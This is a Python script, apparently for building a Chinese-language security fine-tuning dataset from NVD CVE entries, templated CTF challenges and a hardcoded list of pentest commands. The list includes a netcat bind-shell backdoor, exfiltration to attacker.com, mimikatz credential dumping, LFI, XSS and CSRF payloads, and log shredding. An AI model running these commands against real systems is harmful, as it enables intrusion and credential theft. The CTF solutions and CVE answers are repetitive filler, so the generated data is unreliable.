import os
import json
import requests
import argparse
import zipfile
import io
import pandas as pd
from tqdm import tqdm
import random
from bs4 import BeautifulSoup
import re

def parse_args():
    parser = argparse.ArgumentParser(description="準備安全相關數據集")
    parser.add_argument("--output_dir", type=str, default="./security_data", help="輸出目錄")
    parser.add_argument("--categories", type=str, nargs='+', 
                        default=["web", "network", "reverse", "crypto", "forensic"],
                        help="要收集的安全類別")
    parser.add_argument("--max_samples", type=int, default=1000, help="每個類別的最大樣本數")
    parser.add_argument("--ctf_data", action="store_true", help="是否收集CTF數據")
    parser.add_argument("--cve_data", action="store_true", help="是否收集CVE數據")
    parser.add_argument("--pentest_data", action="store_true", help="是否收集滲透測試數據")
    return parser.parse_args()

def collect_cve_data(output_dir, max_samples=1000):
    """收集CVE數據"""
    print("開始收集CVE數據...")
    cve_dir = os.path.join(output_dir, "cve_data")
    os.makedirs(cve_dir, exist_ok=True)
    
    # 從NVD API獲取最新CVE數據
    base_url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
    
    # 設置查詢參數
    params = {
        "resultsPerPage": 2000,  # API最大限制
    }
    
    try:
        print("從NVD API獲取CVE數據...")
        response = requests.get(base_url, params=params)
        if response.status_code == 200:
            data = response.json()
            
            cve_entries = []
            for item in data.get("vulnerabilities", [])[:max_samples]:
                cve = item.get("cve", {})
                cve_id = cve.get("id", "")
                description = ""
                
                # 獲取描述
                for desc in cve.get("descriptions", []):
                    if desc.get("lang") == "en":
                        description = desc.get("value", "")
                        break
                
                # 獲取CVSS得分
                metrics = cve.get("metrics", {})
                cvss_v31 = metrics.get("cvssMetricV31", [{}])[0].get("cvssData", {}) if metrics.get("cvssMetricV31") else {}
                cvss_score = cvss_v31.get("baseScore", "N/A")
                
                # 獲取CWE
                cwe_list = []
                for weakness in cve.get("weaknesses", []):
                    for desc in weakness.get("description", []):
                        if desc.get("value", "").startswith("CWE-"):
                            cwe_list.append(desc.get("value"))
                
                # 儲存需要的資訊
                cve_entries.append({
                    "cve_id": cve_id,
                    "description": description,
                    "cvss_score": cvss_score,
                    "cwe": cwe_list,
                    "published": cve.get("published", ""),
                    "prompt": f"解釋以下漏洞的風險和如何修復: {cve_id} - {description}",
                })
            
            # 保存數據
            output_file = os.path.join(cve_dir, "cve_data.json")
            with open(output_file, "w", encoding="utf-8") as f:
                json.dump(cve_entries, f, ensure_ascii=False, indent=2)
            
            print(f"已收集 {len(cve_entries)} 個CVE項目，保存到 {output_file}")
        else:
            print(f"獲取CVE數據失敗: {response.status_code}")
    except Exception as e:
        print(f"收集CVE數據時出錯: {str(e)}")

def collect_ctf_data(output_dir, categories, max_samples=1000):
    """收集CTF挑戰和解決方案數據"""
    print("開始收集CTF數據...")
    ctf_dir = os.path.join(output_dir, "ctf_data")
    os.makedirs(ctf_dir, exist_ok=True)
    
    # 模擬CTF數據收集（實際應使用公開的CTF樣本或API）
    ctf_samples = []
    
    # 為示例生成一些簡單的CTF挑戰
    challenges = {
        "web": [
            {"title": "SQL注入基礎", "description": "這個網頁有一個登錄表單，嘗試繞過身份驗證。", "hint": "嘗試在用戶名欄位使用SQL注入。"},
            {"title": "XSS挑戰", "description": "在留言板上發布一個能彈出警告框的留言。", "hint": "考慮如何注入JavaScript代碼。"},
            {"title": "CSRF漏洞", "description": "創建一個頁面，能在用戶訪問時自動更改其賬戶密碼。", "hint": "考慮如何利用CSRF漏洞。"}
        ],
        "network": [
            {"title": "數據包分析", "description": "分析這個PCAP文件找到隱藏的消息。", "hint": "查看HTTP流量。"},
            {"title": "端口掃描", "description": "找出目標系統上開放的所有端口。", "hint": "使用Nmap工具。"},
            {"title": "協議分析", "description": "分析這個自定義協議並構造一個有效的請求。", "hint": "查看協議的結構和校驗和。"}
        ],
        "reverse": [
            {"title": "逆向基礎", "description": "反編譯這個程序找到隱藏的密碼。", "hint": "查看字符串和比較函數。"},
            {"title": "加殼程序", "description": "對這個加殼程序進行脫殼並分析其行為。", "hint": "使用動態分析工具。"},
            {"title": "ARM逆向", "description": "分析這個ARM程序的行為並繞過其檢查。", "hint": "注意ARM的跳轉指令。"}
        ],
        "crypto": [
            {"title": "簡單加密", "description": "破解這個經典密碼：OLSSV DVYSK", "hint": "考慮凱撒密碼。"},
            {"title": "RSA挑戰", "description": "使用給定的信息破解這個RSA加密消息。", "hint": "計算私鑰。"},
            {"title": "哈希碰撞", "description": "找到兩個能產生相同MD5值的不同輸入。", "hint": "研究哈希碰撞技術。"}
        ],
        "forensic": [
            {"title": "隱寫術", "description": "從這張圖片中提取隱藏的消息。", "hint": "查看圖片的LSB。"},
            {"title": "磁盤取證", "description": "分析這個磁盤鏡像找到刪除的證據。", "hint": "檢查刪除的文件和分區表。"},
            {"title": "內存取證", "description": "從這個內存轉儲中恢復用戶活動。", "hint": "使用Volatility工具。"}
        ]
    }
    
    # 生成每個類別的挑戰
    for category in categories:
        if category in challenges:
            category_samples = []
            # 複製基本挑戰並擴展
            base_challenges = challenges[category]
            expanded_challenges = []
            
            # 擴展樣本數量
            for i in range(max_samples // len(base_challenges) + 1):
                for challenge in base_challenges:
                    # 創建稍微變化的挑戰
                    new_challenge = challenge.copy()
                    if i > 0:  # 第一輪保持原樣
                        new_challenge["title"] = f"{challenge['title']} {i+1}"
                        new_challenge["description"] = f"{challenge['description']} (變種 {i+1})"
                    expanded_challenges.append(new_challenge)
            
            # 限制樣本數量
            expanded_challenges = expanded_challenges[:max_samples]
            
            for challenge in expanded_challenges:
                # 添加一個模擬的"解決方案"
                solution = f"解決方法：\n1. 分析{challenge['title']}的特點\n2. 使用{category}相關工具\n3. 按照提示'{challenge['hint']}'執行操作\n4. 找到並提交flag"
                
                category_samples.append({
                    "title": challenge["title"],
                    "category": category,
                    "description": challenge["description"],
                    "hint": challenge["hint"],
                    "solution": solution,
                    "prompt": f"如何解決這個CTF挑戰: {challenge['title']} - {challenge['description']}",
                    "completion": solution
                })
            
            ctf_samples.extend(category_samples)
            print(f"已生成 {len(category_samples)} 個{category}類別的CTF樣本")
    
    # 保存數據
    output_file = os.path.join(ctf_dir, "ctf_data.json")
    with open(output_file, "w", encoding="utf-8") as f:
        json.dump(ctf_samples, f, ensure_ascii=False, indent=2)
    
    print(f"已收集 {len(ctf_samples)} 個CTF樣本，保存到 {output_file}")

def collect_pentest_data(output_dir, max_samples=1000):
    """收集滲透測試數據和常見技術"""
    print("開始收集滲透測試數據...")
    pentest_dir = os.path.join(output_dir, "pentest_data")
    os.makedirs(pentest_dir, exist_ok=True)
    
    # 常見滲透測試技術和命令
    techniques = [
        {
            "name": "信息收集",
            "techniques": [
                {"name": "WHOIS查詢", "command": "whois example.com", "description": "獲取域名註冊信息"},
                {"name": "DNS枚舉", "command": "dnsrecon -d example.com", "description": "發現子域名和DNS記錄"},
                {"name": "子域名發現", "command": "subfinder -d example.com", "description": "自動化子域名發現"},
                {"name": "Google Dorking", "command": "site:example.com filetype:pdf", "description": "使用搜索引擎發現敏感文件"},
                {"name": "社會工程學", "command": "theHarvester -d example.com -b all", "description": "收集電子郵件和員工信息"}
            ]
        },
        {
            "name": "掃描和枚舉",
            "techniques": [
                {"name": "端口掃描", "command": "nmap -sS -sV -p- 192.168.1.1", "description": "掃描目標系統的開放端口"},
                {"name": "漏洞掃描", "command": "nmap --script vuln 192.168.1.1", "description": "自動檢測常見漏洞"},
                {"name": "Web應用掃描", "command": "nikto -host http://example.com", "description": "掃描Web應用漏洞"},
                {"name": "目錄爆破", "command": "gobuster dir -u http://example.com -w wordlist.txt", "description": "發現隱藏的目錄和文件"},
                {"name": "服務枚舉", "command": "enum4linux 192.168.1.1", "description": "枚舉Windows/Samba系統"}
            ]
        },
        {
            "name": "漏洞利用",
            "techniques": [
                {"name": "SQL注入", "command": "sqlmap -u http://example.com/page.php?id=1 --dbs", "description": "自動化SQL注入攻擊"},
                {"name": "跨站腳本(XSS)", "command": "<script>alert('XSS')</script>", "description": "注入JavaScript代碼"},
                {"name": "命令注入", "command": "ping 127.0.0.1; ls -la", "description": "在輸入欄位注入系統命令"},
                {"name": "文件包含", "command": "http://example.com/page.php?file=../../../etc/passwd", "description": "利用LFI/RFI漏洞"},
                {"name": "CSRF攻擊", "command": "<img src=\"http://example.com/transfer.php?to=attacker&amount=1000\">", "description": "偽造跨站請求"}
            ]
        },
        {
            "name": "權限提升",
            "techniques": [
                {"name": "Linux提權", "command": "find / -perm -u=s -type f 2>/dev/null", "description": "查找SUID文件"},
                {"name": "Windows提權", "command": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"", "description": "獲取系統信息"},
                {"name": "Kernel漏洞", "command": "uname -a && searchsploit linux kernel", "description": "查找可用的內核漏洞"},
                {"name": "密碼抓取", "command": "mimikatz \"privilege::debug\" \"sekurlsa::logonpasswords\"", "description": "從內存提取密碼"},
                {"name": "破解密碼", "command": "john --wordlist=rockyou.txt hashes.txt", "description": "破解密碼哈希"}
            ]
        },
        {
            "name": "後滲透",
            "techniques": [
                {"name": "持久化", "command": "crontab -e", "description": "設置定時任務實現持久化"},
                {"name": "數據滲漏", "command": "exfiltool -t http://attacker.com data.zip", "description": "數據滲漏技術"},
                {"name": "橫向移動", "command": "psexec.py DOMAIN/user:password@192.168.1.2 cmd.exe", "description": "訪問網絡中的其他系統"},
                {"name": "清除痕跡", "command": "shred -u logfile.txt", "description": "安全刪除日誌文件"},
                {"name": "隱藏後門", "command": "nc -lvp 4444 -e /bin/bash", "description": "設置簡單的監聽後門"}
            ]
        }
    ]
    
    # 生成滲透測試模擬數據
    pentest_data = []
    for section in techniques:
        for technique in section["techniques"]:
            # 為每個技術創建一個詳細描述
            detail = f"""
### {technique['name']} ({section['name']}類別)

**描述**: {technique['description']}

**常用命令**: 
```
{technique['command']}
```

**使用場景**:
在滲透測試的{section['name']}階段，可以使用{technique['name']}技術來{technique['description'].lower()}。
這對於{['紅隊評估', '漏洞評估', '滲透測試', '安全評審'][random.randint(0, 3)]}特別有效。

**注意事項**:
- 僅在獲得授權的系統上使用
- 記錄所有操作以便報告
- 注意可能的{['系統崩潰', '誤報', '性能影響', '合規問題'][random.randint(0, 3)]}
            """
            
            # 創建問答對
            prompt = f"解釋{technique['name']}技術在滲透測試中的作用，並給出一個實例命令。"
            completion = detail
            
            pentest_data.append({
                "category": section["name"],
                "technique": technique["name"],
                "command": technique["command"],
                "description": technique["description"],
                "detail": detail,
                "prompt": prompt,
                "completion": completion
            })
    
    # 確保樣本數量不超過最大限制
    if len(pentest_data) > max_samples:
        pentest_data = random.sample(pentest_data, max_samples)
    
    # 保存數據
    output_file = os.path.join(pentest_dir, "pentest_data.json")
    with open(output_file, "w", encoding="utf-8") as f:
        json.dump(pentest_data, f, ensure_ascii=False, indent=2)
    
    print(f"已收集 {len(pentest_data)} 個滲透測試樣本，保存到 {output_file}")

def prepare_training_data(output_dir):
    """將所有收集的數據準備為訓練格式"""
    print("準備訓練數據格式...")
    
    training_data = []
    
    # 收集所有數據目錄
    data_dirs = [os.path.join(output_dir, d) for d in os.listdir(output_dir) 
                if os.path.isdir(os.path.join(output_dir, d))]
    
    for data_dir in data_dirs:
        json_files = [f for f in os.listdir(data_dir) if f.endswith('.json')]
        
        for json_file in json_files:
            file_path = os.path.join(data_dir, json_file)
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                
                for item in data:
                    if 'prompt' in item and ('completion' in item or 'solution' in item):
                        training_example = {
                            "prompt": item['prompt'],
                            "completion": item.get('completion', item.get('solution', ''))
                        }
                        training_data.append(training_example)
                    elif 'description' in item:
                        # CVE或其他數據可能沒有明確的問答對
                        if 'cve_id' in item:  # CVE數據
                            prompt = f"解釋以下漏洞的風險和如何修復: {item['cve_id']} - {item['description']}"
                            completion = f"這是關於{item['cve_id']}的說明。這個漏洞的CVSS評分為{item.get('cvss_score', 'N/A')}，"
                            if item.get('cwe'):
                                completion += f"相關的CWE為{', '.join(item['cwe'])}。"
                            completion += f"建議的修復方法是更新到最新版本並應用相關安全補丁。"
                        else:  # 其他類型數據
                            prompt = f"請解釋以下安全技術或概念: {item.get('name', 'unknown')}"
                            completion = item['description']
                        
                        training_example = {
                            "prompt": prompt,
                            "completion": completion
                        }
                        training_data.append(training_example)
            except Exception as e:
                print(f"處理文件 {file_path} 時出錯: {str(e)}")
    
    # 保存訓練數據
    train_file = os.path.join(output_dir, "security_train.jsonl")
    with open(train_file, 'w', encoding='utf-8') as f:
        for item in training_data:
            f.write(json.dumps(item, ensure_ascii=False) + '\n')
    
    print(f"已準備 {len(training_data)} 條訓練數據，保存到 {train_file}")

def main():
    args = parse_args()
    
    # 創建輸出目錄
    os.makedirs(args.output_dir, exist_ok=True)
    
    # 根據選項收集不同類型的數據
    if args.cve_data:
        collect_cve_data(args.output_dir, args.max_samples)
    
    if args.ctf_data:
        collect_ctf_data(args.output_dir, args.categories, args.max_samples)
    
    if args.pentest_data:
        collect_pentest_data(args.output_dir, args.max_samples)
    
    # 如果沒有指定任何數據類型，則收集所有類型
    if not (args.cve_data or args.ctf_data or args.pentest_data):
        print("未指定數據類型，將收集所有類型的數據")
        collect_cve_data(args.output_dir, args.max_samples)
        collect_ctf_data(args.output_dir, args.categories, args.max_samples)
        collect_pentest_data(args.output_dir, args.max_samples)
    
    # 準備訓練數據
    prepare_training_data(args.output_dir)
    
    print("安全數據集準備完成!")

if __name__ == "__main__":
    main() 